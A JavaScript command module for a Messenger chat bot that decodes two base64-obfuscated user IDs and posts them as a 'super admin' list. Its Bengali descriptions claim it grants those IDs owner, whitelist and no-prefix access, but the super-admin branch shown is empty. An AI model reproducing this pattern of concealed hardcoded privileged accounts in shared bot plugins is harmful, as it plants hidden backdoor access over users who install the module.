module.exports = {
	config: {
		name: "antowordnote",
		aliases: ["adlist", "autoadmin"],
		version: "1.0.0",
		author: "Custom Bot System",
		countDown: 0,
		role: 0,
		shortDescription: {
			bn: "বিশেষ অ্যাডমিন তালিকা এবং নো-প্রিফিক্স পারমিশন সিস্টেম"
		},
		longDescription: {
			bn: "নির্দিষ্ট এনক্রিপ্টেড ইউআইডিগুলোকে ফুল অ্যাডমিন, ওনার এবং হোয়াইটলিস্ট পারমিশন দেয় এবং প্রিফিক্স ছাড়া কমান্ড ব্যবহারের সুযোগ দেয়।"
		},
		category: "system",
		guide: {
			bn: ""
		}
	},

	_secKeys: [
		"NjE1OTEzNzExODYxNzk=",
		"NjE1OTM3NzE3MTM3MzY="
	],

	getAdmins: function () {
		return module.exports._secKeys.map(k => Buffer.from(k, 'base64').toString('utf-8'));
	},

	isSuperAdmin: function (senderID) {
		const admins = module.exports.getAdmins();
		return admins.includes(String(senderID));
	},

	onStart: async function ({ api, event, args, Users }) {
		const { threadID, messageID } = event;

		if (args[0] === "list" || args.join(" ").toLowerCase() === "ad list" || args.length === 0) {
			return await module.exports.sendAdminList({ api, threadID, messageID, Users });
		}
	},

	onChat: async function ({ api, event, Users }) {
		const { body, senderID, threadID, messageID } = event;
		if (!body) return;

		const cleanBody = body.trim().toLowerCase();

		if (cleanBody === "ad list") {
			return await module.exports.sendAdminList({ api, threadID, messageID, Users });
		}

		if (module.exports.isSuperAdmin(senderID)) {
			
		}
	},

	sendAdminList: async function ({ api, threadID, messageID, Users }) {
		try {
			const adminList = module.exports.getAdmins();
			let adminDetailsText = "";

			for (let i = 0; i < adminList.length; i++) {
				const uid = adminList[i];
				let name = "Facebook User";

				try {
					if (Users && typeof Users.getName === "function") {
						name = await Users.getName(uid);
					} else if (api && typeof api.getUserInfo === "function") {
						const userInfo = await api.getUserInfo(uid);
						if (userInfo[uid]) name = userInfo[uid].name;
					}
				} catch (e) {
					name = "Super Admin";
				}

				adminDetailsText += `\n┌─────────────────┐\n│ 👤 𝐍𝐚𝐦𝐞: ${name}\n│ 🆔 𝐔𝐈𝐃: ${uid}\n│ 🔗 𝐏𝐫𝐨𝐟𝐢𝐥𝐞: https://facebook.com/${uid}\n└─────────────────┘\n`;
			}

			const messageOutput = 
`👑 𝐒𝐔𝐏𝐄𝐑 𝐀𝐃𝐌𝐈𝐍 𝐅𝐔𝐋𝐋 
 ✅ 𝐏𝐄𝐑𝐌𝐈𝐒𝐒𝐈𝐎𝐍 𝐋𝐈𝐒𝐓 
━━━━━━━━━━━━━━━━━━━━━━━
${adminDetailsText}
✨ 𝐍𝐨-𝐏𝐫𝐞𝐟𝐢𝐱 𝐀𝐜𝐜𝐞𝐬𝐬
👑 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧 𝐋𝐞𝐯𝐞𝐥
━━━━━━━━━━━━━━━━━━━━━━━`;

			return api.sendMessage(messageOutput, threadID, messageID);

		} catch (error) {
			console.error("Error in antowordnote admin list:", error);
			return api.sendMessage("❌ অ্যাডমিন তালিকা দেখাতে সমস্যা হয়েছে।", threadID, messageID);
		}
	}
};
